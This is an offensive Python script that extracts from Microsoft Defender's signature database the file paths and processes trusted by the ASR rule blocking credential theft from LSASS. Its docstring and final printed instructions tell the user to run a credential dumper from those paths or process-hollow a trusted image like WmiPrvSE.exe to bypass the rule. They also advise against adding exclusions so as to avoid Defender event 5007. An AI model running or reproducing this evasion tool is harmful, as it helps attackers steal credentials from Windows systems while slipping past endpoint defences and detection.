#!/usr/bin/env python3
"""
extract_asr_exclusions.py - Recover the file paths / process names that Microsoft Defender treats
as TRUSTED (excluded) for the ASR "Block credential stealing from LSASS" rule, by carving them out
of the decompressed Defender signature database (VDM). Running a credential-access tool from one of
these paths, or hollowing one of these trusted images, bypasses the LSASS ASR rule.

Two input modes:
  1. --base path to mpasbase.vdm (compressed) -> the script decompresses to .extracted first
     (requires the loadlibrary/mpclient or Microsoft's WDExtract; if unavailable, pass --extracted).
  2. --extracted path to an ALREADY decompressed mpasbase.vdm.extracted -> carve directly.

The carver locates the ASR rule GUID and harvests nearby UTF-16LE/ASCII path-like strings.

Usage:
    python extract_asr_exclusions.py --extracted mpasbase.vdm.extracted
    python extract_asr_exclusions.py --extracted mpasbase.vdm.extracted --guid 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0
    python extract_asr_exclusions.py --base "C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\Backup\\mpasbase.vdm"

Default location of the signature backup:
    C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\Backup\\mpasbase.vdm

Cross-reference HackingLZ/ExtractedDefender for pre-extracted lists.
Dependencies: standard library only. For authorized engagement use only.
"""
import argparse
import os
import re
import subprocess
import sys

# LSASS credential-theft ASR rule GUID (the rule whose exclusions we want)
LSASS_ASR_GUID = "9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0"

PATHLIKE = re.compile(rb"[A-Za-z]:\\[ -~]{3,200}\.(?:exe|dll|sys|com|scr)", re.IGNORECASE)
ENVPATH = re.compile(rb"%[A-Za-z0-9_()]+%\\[ -~]{2,200}\.(?:exe|dll|sys|com|scr)", re.IGNORECASE)
BARE_EXE = re.compile(rb"(?<![ -~])([A-Za-z0-9_.+-]{3,64}\.(?:exe|dll))(?![ -~])", re.IGNORECASE)


def decode_strings(blob):
    """Yield path-like strings from a byte blob, handling both ASCII and UTF-16LE."""
    found = set()
    for rx in (PATHLIKE, ENVPATH, BARE_EXE):
        for m in rx.finditer(blob):
            found.add(m.group(0).decode("ascii", "ignore"))
    # UTF-16LE: strip null bytes between ASCII chars, then re-scan
    utf16_ascii = bytes(b for b in blob if b != 0x00)
    for rx in (PATHLIKE, ENVPATH, BARE_EXE):
        for m in rx.finditer(utf16_ascii):
            found.add(m.group(0).decode("ascii", "ignore"))
    return found


def try_decompress(base_path):
    """Attempt to produce a .extracted file next to base_path. Returns path or None."""
    extracted = base_path + ".extracted"
    if os.path.exists(extracted):
        return extracted
    # WDExtract / loadlibrary's mpclient is the standard route; invoke it via subprocess with an
    # argument list (no shell) to avoid command injection from the path argument.
    for tool in ("WDExtract.exe", "wdextract"):
        try:
            subprocess.run([tool, base_path, extracted],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        except (OSError, subprocess.SubprocessError):
            continue
        if os.path.exists(extracted):
            return extracted
    return None


def main():
    ap = argparse.ArgumentParser(description="Carve ASR LSASS-rule exclusion/trusted paths from Defender VDM.")
    ap.add_argument("--base", help="compressed mpasbase.vdm (will try to decompress)")
    ap.add_argument("--extracted", help="already-decompressed mpasbase.vdm.extracted")
    ap.add_argument("--guid", default=LSASS_ASR_GUID, help="ASR rule GUID to anchor on")
    ap.add_argument("--window", type=int, default=0x8000, help="bytes around the GUID to scan")
    ap.add_argument("--all", action="store_true", help="scan whole file, not just around the GUID")
    args = ap.parse_args()

    path = args.extracted
    if not path and args.base:
        path = try_decompress(args.base)
        if not path:
            print("[!] Could not decompress. Install WDExtract (taviso/loadlibrary) or pass "
                  "--extracted.", file=sys.stderr)
            sys.exit(2)
    if not path or not os.path.exists(path):
        print("[!] Provide --extracted <mpasbase.vdm.extracted> (or --base to auto-decompress).",
              file=sys.stderr)
        sys.exit(2)

    with open(path, "rb") as f:
        data = f.read()
    print(f"[*] Loaded {len(data):,} bytes from {path}")

    guid_variants = [
        args.guid.encode("ascii"),
        args.guid.encode("utf-16-le"),
        args.guid.replace("-", "").encode("ascii"),
    ]
    anchors = []
    for gv in guid_variants:
        start = 0
        while True:
            idx = data.find(gv, start)
            if idx < 0:
                break
            anchors.append(idx)
            start = idx + 1

    if args.all:
        paths = decode_strings(data)
        print(f"[*] Whole-file scan (GUID anchors found: {len(anchors)})")
    elif anchors:
        print(f"[*] Found ASR GUID at {len(anchors)} offset(s); scanning +/-0x{args.window:x} each")
        paths = set()
        for a in anchors:
            lo = max(0, a - args.window)
            hi = min(len(data), a + args.window)
            paths |= decode_strings(data[lo:hi])
    else:
        print("[!] ASR GUID not found; falling back to whole-file scan. Results are noisier.")
        paths = decode_strings(data)

    paths = sorted(paths, key=lambda s: s.lower())
    print(f"\n[+] {len(paths)} candidate trusted/excluded path(s) for the LSASS ASR rule:")
    for p in paths:
        print(f"    {p}")
    print("\n[i] Run your dumper from one of these paths, or hollow one of the trusted images")
    print("    (e.g. WmiPrvSE.exe), to bypass the LSASS ASR rule. Do NOT add a new exclusion")
    print("    (that fires Defender event 5007).")


if __name__ == "__main__":
    main()
